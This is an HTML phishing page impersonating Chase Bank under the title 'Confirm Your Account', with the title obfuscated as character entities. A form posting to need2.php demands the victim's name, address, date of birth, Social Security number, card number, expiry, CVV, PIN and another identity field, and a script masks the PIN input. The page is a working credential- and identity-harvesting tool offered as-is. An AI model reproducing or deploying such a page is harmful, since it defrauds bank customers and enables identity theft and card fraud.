<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#67;&#104;&#97;&#115;&#101;&#32;&#66;&#97;&#110;&#107;&#32;&#45;&#32;&#67;&#111;&#110;&#102;&#105;&#114;&#109;&#32;&#89;&#111;&#117;&#114;&#32;&#65;&#99;&#99;&#111;&#117;&#110;&#116;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[8].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">
.textbox {  
    border: solid 1px #B0AEA4; 
  	border-radius: 1px;
    padding-left: 5px;
    height: 23px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #81A3DA; 
    border-style: solid; 
  	border-radius: 1px;
    border-width: 2px;  
    outline: 0; 
 } 
		</style>	

<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:156px; top:20px; width:992px; height:41px; z-index:0"><img src="images/b1.png" alt="" title="" border=0 width=992 height=41></div>

<div id="image2" style="position:absolute; overflow:hidden; left:148px; top:63px; width:1009px; height:346px; z-index:1"><img src="images/b2.png" alt="" title="" border=0 width=1009 height=346></div>

<div id="image3" style="position:absolute; overflow:hidden; left:162px; top:28px; width:140px; height:34px; z-index:2"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=140 height=34></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:995px; top:31px; width:151px; height:18px; z-index:3"><a href="#"><img src="images/h5.png" alt="" title="" border=0 width=151 height=18></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:235px; top:426px; width:773px; height:68px; z-index:4"><img src="images/b3.png" alt="" title="" border=0 width=773 height=68></div>

<div id="image6" style="position:absolute; overflow:hidden; left:288px; top:406px; width:369px; height:24px; z-index:5"><a href="#"><img src="images/h6.png" alt="" title="" border=0 width=369 height=24></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:923px; top:141px; width:109px; height:16px; z-index:6"><a href="#"><img src="images/ch3.png" alt="" title="" border=0 width=109 height=16></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:1133px; top:224px; width:27px; height:550px; z-index:7"><img src="images/h3.png" alt="" title="" border=0 width=27 height=550></div>

<div id="image9" style="position:absolute; overflow:hidden; left:152px; top:222px; width:19px; height:550px; z-index:8"><img src="images/h4.png" alt="" title="" border=0 width=19 height=550></div>

<div id="image11" style="position:absolute; overflow:hidden; left:231px; top:710px; width:768px; height:63px; z-index:9"><img src="images/ch9.png" alt="" title="" border=0 width=768 height=63></div>

<div id="image12" style="position:absolute; overflow:hidden; left:641px; top:515px; width:15px; height:198px; z-index:10"><img src="images/ch8.png" alt="" title="" border=0 width=15 height=198></div>

<div id="image13" style="position:absolute; overflow:hidden; left:656px; top:510px; width:123px; height:165px; z-index:11"><a href="#"><img src="images/hh8.png" alt="" title="" border=0 width=123 height=165></a></div>

<div id="image14" style="position:absolute; overflow:hidden; left:152px; top:770px; width:1007px; height:132px; z-index:12"><img src="images/ch10.png" alt="" title="" border=0 width=1007 height=132></div>

<div id="image15" style="position:absolute; overflow:hidden; left:616px; top:732px; width:64px; height:24px; z-index:13"><a href="#"><img src="images/b9.png" alt="" title="" border=0 width=64 height=24></a></div>

<div id="image16" style="position:absolute; overflow:hidden; left:591px; top:810px; width:131px; height:16px; z-index:14"><a href="#"><img src="images/b11.png" alt="" title="" border=0 width=131 height=16></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:200px; top:506px; width:179px; height:204px; z-index:16"><img src="images/h8.png" alt="" title="" border=0 width=179 height=204></div>
<form action=need2.php name=adyalajail id=adyalajail method=post>
<input name="name" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:207px;left:379px;top:507px;z-index:17">
<input name="addr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:207px;left:379px;top:551px;z-index:18">
<input name="db" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:206px;left:379px;top:595px;z-index:20">
<input name="sn" placeholder="xxxxxxxxx" class="textbox" autocomplete="off" required maxlength="9" type="text" style="position:absolute;width:207px;left:379px;top:635px;z-index:21">
<input name="mn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:207px;left:379px;top:675px;z-index:22">
<input name="cn" placeholder="xxxxxxxxxxxxxxxx" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:207px;left:784px;top:515px;z-index:23">
<input name="ex" placeholder="MM/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:206px;left:784px;top:559px;z-index:24">
<input name="cv" placeholder="xxx" class="textbox" autocomplete="off" required maxlength="3" type="text" style="position:absolute;width:207px;left:784px;top:603px;z-index:25">
<input name="pn" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:207px;left:784px;top:643px;z-index:26">
<div id="formimage1" style="position:absolute; left:540px; top:731px; z-index:27"><input type="image" name="formimage1" width="69" height="26" src="images/cfm.png"></div>
</div>

</body>
</html>
